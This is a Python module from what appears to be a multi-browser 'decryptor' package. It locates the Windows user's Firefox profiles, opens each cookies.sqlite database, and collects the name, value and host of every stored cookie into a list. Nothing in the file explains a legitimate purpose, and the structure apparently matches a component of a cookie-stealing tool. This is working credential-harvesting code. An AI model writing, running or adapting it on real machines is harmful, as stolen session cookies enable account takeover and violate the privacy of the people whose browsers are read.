from decryptors.Decryptor import Decryptor

import os
import sqlite3

class Firefox(Decryptor):

    firefox_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

    def Decrypt(self):
        out = []

        # Searching for needed profile folder
        for file in os.listdir(Firefox.firefox_path):
            if(file.endswith("release")):
                db_path = os.path.join(Firefox.firefox_path, file, "cookies.sqlite")
                connection = sqlite3.connect(db_path)

                cursor = connection.cursor()
                cursor.execute("SELECT name, value, host FROM 'moz_cookies';")

                for name, value, host in cursor.fetchall():
                    # Because Firefox doesn't have any cookie encryption, we don't need to decrypt it. Simply put it to output array

                    out.append({
                        "host": host,
                        "name": name,
                        "value": value
                    })
        
                cursor.close()
                connection.close()

        return out
    
    def GetBrowser(self):
        return "Firefox"